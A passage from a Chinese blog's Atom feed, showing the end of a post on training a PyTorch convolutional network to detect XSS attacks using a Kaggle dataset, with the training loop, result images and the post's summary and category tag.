class="keyword">for</span> epoch <span class="keyword">in</span> range(epochs):</span><br><span class="line">    train(model,trainX,trainY,optimizer,epoch)</span><br><span class="line">    test_model(model,testX,testY)</span><br></pre></td></tr></table></figure><h4 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h4><p><img src="/2021/04/23/CNN检测XSS攻击-Pytorch/1.png" alt="1"></p><p><img src="/2021/04/23/CNN检测XSS攻击-Pytorch/2.png" alt="2"></p><p><img src="/2021/04/23/CNN检测XSS攻击-Pytorch/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;之前在Kaggle上看到了一个XSS的数据集，所以想着用pytorch实现一下，代码参考了kaggle上有人用keras实现的。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="机器学习" scheme="elssm.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
